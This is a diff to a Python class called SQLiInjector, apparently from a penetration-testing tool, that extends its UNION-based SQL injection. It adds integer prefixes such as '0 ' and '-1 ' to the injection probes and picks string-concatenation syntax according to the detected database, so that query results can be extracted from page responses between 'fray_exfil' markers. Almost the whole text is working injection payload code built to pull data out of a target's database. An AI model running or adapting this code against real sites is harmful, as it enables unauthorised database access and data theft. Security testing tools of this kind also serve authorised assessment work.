@@ -539,8 +539,8 @@ class SQLiInjector:
             cols.append(marker)
         cols_str = ",".join(cols)
 
-        # Try different quote styles
-        for prefix in ["' ", "\" ", " ", "') ", "\") "]:
+        # Try different quote styles (integer + string)
+        for prefix in ["0 ", "-1 ", "' ", "\" ", " ", "') ", "\") "]:
             dbms = self._detected_dbms or "generic"
             union_tmpl = _UNION_PAYLOADS_BY_DBMS.get(dbms, _UNION_PAYLOADS_BY_DBMS["generic"])
             payload = f"{prefix}{union_tmpl.format(cols=cols_str)}"
@@ -708,15 +708,28 @@ class SQLiInjector:
         cols = ["NULL"] * self._union_columns
         marker = "fray_exfil_start"
         end_marker = "fray_exfil_end"
-        cols[0] = f"CONCAT('{marker}',({query}),'{end_marker}')"
-        cols_str = ",".join(cols)
 
-        for prefix in ["' ", "\" ", " "]:
-            payload = f"{prefix}UNION ALL SELECT {cols_str}-- -"
-            _, body, _ = self._request(payload)
-            m = re.search(f"{marker}(.*?){end_marker}", body, re.DOTALL)
-            if m:
-                return m.group(1).strip()
+        # Try DBMS-appropriate concat syntax
+        concat_variants = []
+        dbms = self._detected_dbms or "generic"
+        if dbms in ("sqlite", "postgresql", "oracle"):
+            concat_variants.append(f"'{marker}'||({query})||'{end_marker}'")
+            concat_variants.append(f"CONCAT('{marker}',({query}),'{end_marker}')")
+        else:
+            concat_variants.append(f"CONCAT('{marker}',({query}),'{end_marker}')")
+            concat_variants.append(f"'{marker}'||({query})||'{end_marker}'")
+
+        for concat_expr in concat_variants:
+            cols_copy = ["NULL"] * self._union_columns
+            cols_copy[0] = concat_expr
+            cols_str = ",".join(cols_copy)
+
+            for prefix in ["0 ", "-1 ", "' ", "\" ", " "]:
+                payload = f"{prefix}UNION ALL SELECT {cols_str}-- -"
+                _, body, _ = self._request(payload)
+                m = re.search(f"{marker}(.*?){end_marker}", body, re.DOTALL)
+                if m:
+                    return m.group(1).strip()
 
         return None
 
